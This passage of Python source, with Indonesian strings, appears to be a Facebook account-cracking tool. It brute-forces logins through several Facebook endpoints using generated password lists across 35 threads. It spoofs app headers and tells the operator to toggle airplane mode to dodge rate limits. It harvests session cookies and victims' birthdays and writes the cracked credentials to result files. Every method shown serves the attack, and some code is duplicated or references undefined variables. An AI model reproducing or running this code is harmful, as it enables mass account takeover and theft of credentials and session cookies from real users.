                    ttl = requests.get("https://graph.facebook.com/%s?access_token=%s"%(user, token)).json()["birthday"]
                    month, day, year = ttl.split("/")
                    month = bulan_ttl[month]
                    dob = ('%s %s %s'%(day, month, year))
                except Exception as e:
                    dob = (' ')
                    if opsii == "y" or "y" == opsii:
#                       sttt(user, pw, dob)
                       try:
                           log_hasill(user, pw, str(dob))
                       except:
                           log_hasill(user, pw, "")
                    else:
                       print ('\r%s[%s%s%s] %s%s|%s | %s      %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,user,pw,dob,Q));play_mpv('assalamualaikum.mp3')
                    wrt = ('%s|%s|%s'%(user,pw,dob))
                    open('Hasil/CP-'+durasi+'.txt', 'a+').write('%s\n' % wrt)
                    cp.append(wrt)
                    bokep_japan_yang_terbaru("CP", user, pw, dob)
                    break
                    continue
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp))),
            sys.stdout.flush()

#                break
 #               continue
        loop += 1
    def mabasic(self,fl):
        try:
            for i in fl.get("pw"):
                try:
                    log = logger(fl.get("id"),i,"https://mbasic.facebook.com")
                except requests.exceptions.ConnectionError:
                    self.kntl += 1
                    sys.stdout.write('\r%s[%s%s%s] Internet Anda Terputus >%s<'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,str(self.kntl))),
                    sys.stdout.flush()
                    time.sleep(2)
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open(".login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"];m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        dob = ("%s %s %s"%(str(d),m,str(y)))
                        if opsii == "y" or "y" == opsii:
                           try:
                               log_hasill(fl.get("id"), i, dob)
                               self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                               break
                           except:
                               log_hasill(fl.get("id"), i, "")
                               self.cp.append("%s|%s"%(fl.get("id"),i))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                               break
                        else:
                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    dob = ("%s %s %s"%(str(d),m,str(y)))
                    if opsii == "y" or "y" == opsii:
                       try:
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                           self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                           break
                       except:
                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           self.cp.append("%s|%s"%(fl.get("id"),i))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                           break
                    else:
                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
                        self.cp.append("%s|%s"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        break
                elif log.get("status")=="success":
                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q));play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
                else:continue
            self.ko += 1
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,self.ko,len(self.fl),len(self.ok),len(self.cp))),
            sys.stdout.flush()
#            print("\r[Crack] %s/%s  OK : %s  CP : %s"%(self.ko,len(self.fl),len(self.ok),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mabasic(fl)
    def mabasicv1(self,fl):
        try:
            for i in fl.get("pw"):
                try:
                    log = log_api_1(fl.get("id"), i)
                except requests.exceptions.ConnectionError:
                    self.kntl += 1
                    sys.stdout.write('\r%s[%s%s%s] Internet Anda Terputus >%s<'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,str(self.kntl))),
                    sys.stdout.flush()
                    time.sleep(2)
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open(".login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"];m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        dob = ("%s %s %s"%(str(d),m,str(y)))
                        if opsii == "y" or "y" == opsii:
                           try:
                               log_hasill(fl.get("id"), i, dob)
                               self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                               break
                           except:
                               log_hasill(fl.get("id"), i, "")
                               self.cp.append("%s|%s"%(fl.get("id"),i))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                               break
                        else:
                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    dob = ("%s %s %s"%(str(d),m,str(y)))
                    if opsii == "y" or "y" == opsii:
                       try:
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                           self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                           break
                       except:
                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           self.cp.append("%s|%s"%(fl.get("id"),i))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                           break
                    else:
                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
                        self.cp.append("%s|%s"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        break
                elif log.get("status")=="success":
                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,koki(log.get("cookies")),Q));play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
                else:continue
            self.ko += 1
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,self.ko,len(self.fl),len(self.ok),len(self.cp))),
            sys.stdout.flush()
#            print("\r[Crack] %s/%s  OK : %s  CP : %s"%(self.ko,len(self.fl),len(self.ok),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mabasicv1(fl)

    def apiv1(self,fl):
        try:
            for i in fl.get("pw"):
                try:
                    log = log_api(fl.get("id"),i,"https://b-api.facebook.com")
                except requests.exceptions.ConnectionError:
                    self.kntl += 1
                    sys.stdout.write('\r%s[%s%s%s] Internet Anda Terputus >%s<'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,str(self.kntl))),
                    sys.stdout.flush()
                    time.sleep(2)
                if log.get("status")=="cp":
                    try:
                        ke = requests.get("https://graph.facebook.com/" + fl.get("id") + "?access_token=" + open(".login.txt","r").read())
                        tt = json.loads(ke.text)
                        ttl = tt["birthday"];m,d,y = ttl.split("/")
                        m = bulan_ttl[m]
                        dob = ("%s %s %s"%(str(d),m,str(y)))
                        if opsii == "y" or "y" == opsii:
                           try:
                               log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                               self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                               break
                           except:
                               log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                               self.cp.append("%s|%s"%(fl.get("id"),i))
                               open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                               break
                        else:
                            print("\r%s[%s%s%s]%s %s|%s|%s %s %s   %s"%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,d,m,y,Q));play_mpv('assalamualaikum.mp3')
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y)) 
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y)) 
                        break
                    except(KeyError, IOError):
                        m = " "
                        d = " "
                        y = " "
                    except:pass
                    dob = ("%s %s %s"%(str(d),m,str(y)))
                    if opsii == "y" or "y" == opsii:
                       try:
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           log_hasill(fl.get("id"), i, dob);play_mpv('assalamualaikum.mp3')
                           self.cp.append("%s|%s|%s%s%s"%(fl.get("id"),i,d,m,y))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s|%s%s%s\n"%(fl.get("id"),i,d,m,y))
                           break
                       except:
                           log_hasill(fl.get("id"), i, "");play_mpv('assalamualaikum.mp3')
                           bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                           self.cp.append("%s|%s"%(fl.get("id"),i))
                           open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                           break
                    else:
                        print("\r%s[%s%s%s]%s %s|%s%s               "%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,K,fl.get("id"),i,Q));play_mpv('assalamualaikum.mp3')
                        self.cp.append("%s|%s"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("CP", fl.get("id"), i, dob)
                        open("Hasil/CP-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        break
                elif log.get("status")=="success":
                        print("\r%s[%sOK%s]%s %s|%s|%s%s              "%(Q,I,Q,I,fl.get("id"),i,""),Q);play_mpv('assalamualaikum.mp3')
                        self.ok.append("%s|%s"%(fl.get("id"),i))
                        open("Hasil/OK-"+durasi+".txt","a+").write("%s|%s\n"%(fl.get("id"),i))
                        bokep_japan_yang_terbaru("OK", fl.get("id"), i, "+")
                        break
                else:continue
            self.ko += 1
            sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s '%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,self.ko,len(self.fl),len(self.ok),len(self.cp))),
            sys.stdout.flush()
#            print("\r[Crack] %s/%s  OK : %s  CP : %s"%(self.ko,len(self.fl),len(self.ok),len(self.cp)), end=' ');sys.stdout.flush()
        except:
            self.mbasic(fl)

    def __api__(self, user, __yan__):
        global ok,cp,loop,opsii
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('Hasil')
            except: pass
            try:
                _kontol = open('.ua', 'r').read()
            except (KeyError, IOError):
                _kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in response.text:
                sys.stdout.write('\r %s[%s!%s] Hidup Matikan Mode Pesawat !!!'%(Q,K,Q)),
                loop+=1
                sys.stdout.flush()
                self.__api__()
            if 'session_key' in response.text and 'EAAA' in response.text:
                coki = ";".join(i["name"]+"="+i["value"] for i in send.json()["session_cookies"])
                print('\r%s[%sOK%s]%s %s|%s|%s                 %s\n' % (Q,I,Q,I,user,pw,coki))
                try:ttll_ = ("%s %s %s"%(day, month, year));bokep_japan_yang_terbaru("", user, pw, ttll_)
                except:bokep_japan_yang_terbaru("", user, pw, "")
                wrt = '%s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('Hasil/OK-%s.txt' % (durasi), 'a').write('%s\n' % wrt)
                break
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                ttl_ = ("%s %s %s"%(day, month, year))
                if opsii == "y" or "y" == opsii:
                   try:
                       log_hasill(user, pw, str(dob))
                   except:
                       log_hasill(user, pw, "")
                else:
                   print('\r%s[%sCP%s]%s %s|%s%s                %s' % (Q,K,Q,K,user,pw,ttl_,Q));play_mpv('assalamualaikum.mp3')
                try:ttll_ = ("%s %s %s"%(day, month, year));bokep_japan_yang_terbaru("", user, pw, ttll_)
                except:bokep_japan_yang_terbaru("", user, pw, "")
                wrt = '%s|%s%s' % (user,pw,ttl_)
                cp.append(wrt)
                open('Hasil/CP-%s.txt' % (durasi), 'a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
        sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
        sys.stdout.flush()


    def mobile_(self, user, kiky__gtg):
        global ok,cp,loop,infoong
        for pw in kiky__gtg:
            pw = pw.lower()
            session = requests.Session()
            session.headers.update({"Host":"m.facebook.com","upgrade-insecure-requests":"1","user-agent":"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = session.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            session.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
#            po = session.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False);garentod(2)
            if 'c_user' in session.cookies.get_dict():
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                wrt = '%s|%s|%s' % (user,pw,coki)
                ok.append(wrt)
                open('Hasil/OK-'+durasi+'.txt','a').write('%s\n' % wrt)
                zczc = ('\r%s╭─[%sOK%s]%s %s|%s\n%s╰─cookie :%s %s                 ' % (Q,I,Q,I,user,pw,P,I,coki));play_mpv('DING.mp3')
                if infoong == "y":
                   cek_cookies_by_risky(user, coki, zczc)
                else:
                   print(zczc)
                akun_ok(user, pw, coki)
                break
            elif 'checkpoint' in session.cookies.get_dict():
                try:
                    kontol = open('.login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print('\r%s[%sCP%s]%s %s|%s|%s %s %s       ' % (Q,K,Q,K,user,pw,day,month,year));play_mpv('bruh.mp3')
                    wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
                    bokep_japan_yang_terbaru("AJG", user, pw, "")
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print('\r%s[%sCP%s]%s %s|%s                 ' % (Q,K,Q,K,user,pw));play_mpv('bruh.mp3')
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('Hasil/CP-'+durasi+'.txt','a').write('%s\n' % wrt)
                bokep_japan_yang_terbaru("AJG", user, pw, "")
                break
            else:
                continue
        loop += 1
        sys.stdout.write('\r%s[%s%s%s] %s/%s OK:%s CP:%s %s'%(Q,C,datetime.now().strftime('%H:%M:%S'),Q,loop,len(self.id),len(ok),len(cp), Q)),
        sys.stdout.flush()





    def mobile__(self, uid, listpw):
                global ok, cp, loop
                sys.stdout.write("\r [*] crack: %s/%s -> OK:-%s - CP:-%s "%(loop, len(id), len(ok), len(cp))); sys.stdout.flush()
                try:
                        for pw in listpw:
                                pw = pw.lower()
                                ses = requests.Session()
                                ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
                                r = ses.get("https://m.facebook.com/index.php")
                                payload = {"lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),"uid":uid,"flow":"login_no_pin","pass":pw,"next":"https://m.facebook.com/home.php"}
                                if "c_user" in ses.cookies.get_dict().keys():
                                        kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                                        print("\r%s[%sOK%s]%s %s|%s|%s%s"%(Q, I, Q, I, uid, pw, kuki, Q))
                                        ok.append("%s|%s"%(uid, pw))
                                        open("Hasil/OK-%s.txt"%(durasi),"a").write("%s|%s|%s\n"%(uid, pw, kuki))
                                        break
                                        continue
                                elif "checkpoint" in ses.cookies.get_dict().keys():
                                        try:
                                                token = open(".login.txt", "r").read()
                                                with requests.Session() as ses:
                                                        ttl = ses.get("https://graph.facebook.com/%s?fields=name,id,birthday&access_token=%s"%(uid, token)).json()["birthday"]
                                                        month, day, year = ttl.split("/")
                                                        month = bulan_ttl[month]
                                                        print("\r%s[%sCP%s]%s %s|%s|%s %s %s%s"%(Q, K, Q, K, uid, pw, day, month, year, Q))
                                                        cp.append("%s|%s"%(uid, pw))
                                                        open("Hasil/CP-%s.txt"%(durasi),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                                                        break
                                        except (KeyError, IOError):
                                                day = (" ")
                                                month = (" ")
                                                year = (" ")
                                        except:pass
                                        print("\r%s[%sCP%s]%s %s|%s%s"%(Q, K, Q, K, uid, pw, Q))
                                        cp.append("%s|%s"%(uid, pw))
                                        open("Hasil/CP-%s.txt"%(durasi),"a").write("%s|%s|%s %s %s\n"%(uid, pw, day, month, year))
                        loop +=1
                except:
                        self.mobile__(uid, listpw)

    def mbasicv1(self, user, pwList):
        global loop, CP, OK, opsii
        loop+=1
        data={}
        url = "https://mbasic.facebook.com"
        session = req.Session()
        session.headers.update({
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate",
        "accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "cache-control":"max-age=0",
        "referer":"https://mbasic.facebook.com/",
        "sec-ch-ua":'";Not A Brand";v="99", "Chromium";v="94"',
        "sec-ch-mobile":"?1",
        "sec-ch-ua-platform":'"Android"',
        "sec-fetch-dest":"document",
        "sec-fetch-mode":"navigate",
        "sec-fetch-site":"same-origin",
        "sec-fetch-user":"?1",
        "upgrade-insecure-requests":"1",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
        })
        for pw in pwList:
                pw = pw.lower()
                soup = par(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
                link = soup.find("form",{"method":"post"})
                lsd = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login"]
                for __data in soup.find_all("input"):
                    if __data.get("name") in lsd:
                       data.update({__data.get("name"):__data.get("value")})
                    data.update({"email":user,"pass":pw})
                try:
                    response = session.post(url+link.get("action"),data=data)
                except:
                    exit(war+"Silahkan Ganti Useragnets")
                if "c_user" in session.cookies.get_dict():
                   if "Akun Anda Dikunci" in response.text:
                      print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw}{M} AKUN INI KENAK SENSI NEW{Q}\n",end="");play_mpv('assalamualaikum.mp3')
                      CP += 1
                   else:
                      OK += 1
                      coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                      print(f"\r{Q}[{I}OK{Q}]{I} {user}|{pw}|{coki}{Q}\n",end="");play_mpv('assalamualaikum.mp3')
                      open("Hasil/OK-"+durasi+".txt","a").write(user+"|"+pw+"|"+coki+"\n")
                      break
                elif "checkpoint" in session.cookies.get_dict():
                   if "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
                      print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw} {M}AKUN INI KENAK A2F ON\n",end="");play_mpv('assalamualaikum.mp3')
                   else:
                      CP += 1
                      if opsii == "y" or "y" == opsii:
                         try:
                             log_hasill(user, pw, "")
                         except:
                             log_hasill(user, pw, "")
                      else:
                         if "Lihat detail login yang ditampilkan. Ini Anda?" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
                            print(f"\r{Q}[{I}OK{Q}] {I}{user}|{pw} {M}AKUN INI TAP YES :V\n",end="");play_mpv('assalamualaikum.mp3')
                         else:
                            print(f"\r{Q}[{K}CP{Q}]{K} {user}|{pw}{Q}               \n",end="");play_mpv('assalamualaikum.mp3')
                      open("Hasil/CP-"+durasi+".txt","a").write(user+"|"+pw+"\n")
                      break
                else:
                   if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(response.text)):
                      TP += 1
                      print(f"\r{Q}[{C}!!{Q}]{M}Hidup Matikan Mode Pesawat Selama 2 Detik >>>{U}{str(TP)}{Q}<<<",end="")
                      continue
                   else:
                      pass
                print(f"\r{Q}[{C}CRACK{Q}] {K}{str(loop)}{Q}/{str(len(self.id))} [{K}CP : {str(CP)}{Q}]  [OK : {I}{str(OK)}{Q}] -> {'{:.1%}'.format(loop/float(len(self.id)))}",end="")
#lll = ["tes","adinar12345"]
#tesi("").mbasicv1("100009422473571", lll)
    def KangKETOD(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('|')
                        form.submit(self.__api__,zz[0], generate(zz[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")
    def KangCOLMEXXX(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('|')
                        form.submit(self.mobile_,zz[0], generate(zz[1]))
#                    except Exception as e:print("\n[!] Error : %s"%(e))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")
    def KangCOLMEXXXX(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('|')
                        form.submit(self.mobile__,zz[0], generate(zz[1]))
                    except Exception as e:print("\n[!] Error : %s"%(e))
#                    except:
 #                       pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")
    def KangCilok(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('|')
                        form.submit(self.api,zz[0], generate(zz[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")
    def KangBOKEP(self):
            with zthreads(max_workers=35) as (form):
            	for uname in self.id:
                    try:
                        zz = uname.split('|')
                        form.submit(self.mbasic,zz[0], generate(zz[1]))
                    except:
                        pass
            os.remove(self.apk)
            exit("\n\n"+war+"Crack Finished")

    def KangSUGENG(self):
                self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
                try:
                    while True:
                        try:self.fs=open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("|")[0],"pw":generate(i.split("|")[1])})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e))
#                ThreadPool(35).map(self.mabasic,self.fl);exit()
                ThreadPool(35).map(self.apiv1,self.fl);os.remove(self.apk);exit()

    def KangJORDI(self):
                self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
                try:
                    while True:
                        try:self.fs=open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("|")[0],"pw":generate(i.split("|")[1])})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e))
                ThreadPool(35).map(self.mabasic,self.fl);exit()
#                ThreadPool(35).map(self.mabasic,self.fl);os.remove(self.apk);exit()
    def KangAGEN(self):
                self.ko,self.cp,self.ok,self.kntl = 0,[],[],0
                try:
                    while True:
                        try:self.fs=open(self.apk).read().splitlines();break
                        except Exception as e:print("\n[!] Error : %s"%(e));continue
                    self.fl=[]
                    for i in self.fs:
                        try:self.fl.append({"id":i.split("|")[0],"pw":generate(i.split("|")[1])})
                        except:continue
                except Exception as e:print("\n[!] Error : %s"%(e))
#                ThreadPool(35).map(self.mabasicv1,self.fl);exit()
